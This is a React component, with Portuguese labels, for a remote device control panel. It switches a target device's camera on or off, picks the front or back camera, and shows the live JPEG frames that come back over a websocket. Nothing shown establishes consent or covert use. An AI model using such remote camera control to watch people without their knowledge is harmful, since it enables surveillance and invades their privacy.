import { useEffect, useRef, useState } from 'react';
import { ws } from '../../ws.js';

export default function LiveCamera({ deviceId, onBack, sendCmd }) {
  const imgRef      = useRef(null);
  const [active, setActive]     = useState(false);
  const [frameCount, setFrameCount] = useState(0);

  useEffect(() => {
    const unsub = ws.onMessage(msg => {
      if (msg.type === 'camera_frame' && msg.device_id === deviceId && imgRef.current) {
        imgRef.current.src = 'data:image/jpeg;base64,' + msg.data;
        setFrameCount(n => n + 1);
      }
    });
    return unsub;
  }, [deviceId]);

  function start() {
    sendCmd('TOGGLE_CAMERA', { enabled: true });
    ws.subscribe('camera', deviceId);
    setActive(true);
  }
  function stop() {
    sendCmd('TOGGLE_CAMERA', { enabled: false });
    ws.unsubscribe('camera', deviceId);
    setActive(false);
  }

  return (
    <div className="fade-up">
      <div className="row-sb mb12">
        <div className="bold txt-gold">📷 CÂMERA AO VIVO</div>
        <button className="btn btn-ghost btn-sm" onClick={onBack}>← VOLTAR</button>
      </div>

      <div style={{ background: '#000', borderRadius: 12, overflow: 'hidden', border: '1px solid var(--gold-border)', position: 'relative', marginBottom: 12 }}>
        <img ref={imgRef} style={{ width: '100%', display: 'block', minHeight: 220, objectFit: 'contain' }} alt="" />
        {!active && (
          <div style={{ position: 'absolute', inset: 0, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(0,0,0,.75)', flexDirection: 'column', gap: 8, color: 'var(--text2)', fontSize: 13 }}>
            <span style={{ fontSize: 36 }}>📷</span>
            <span>Câmera inativa</span>
          </div>
        )}
        {active && (
          <div style={{ position: 'absolute', top: 8, right: 8 }}>
            <span className="pill pill-green">{frameCount} frames</span>
          </div>
        )}
      </div>

      <div className="grid g2 mb8">
        <button className="btn btn-gold btn-block" onClick={start}>▶ INICIAR</button>
        <button className="btn btn-red btn-block" onClick={stop}>⏹ PARAR</button>
        <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('SWITCH_CAMERA', { camera: 'front' })}>📷 FRONTAL</button>
        <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('SWITCH_CAMERA', { camera: 'back' })}>📷 TRASEIRA</button>
      </div>
    </div>
  );
}
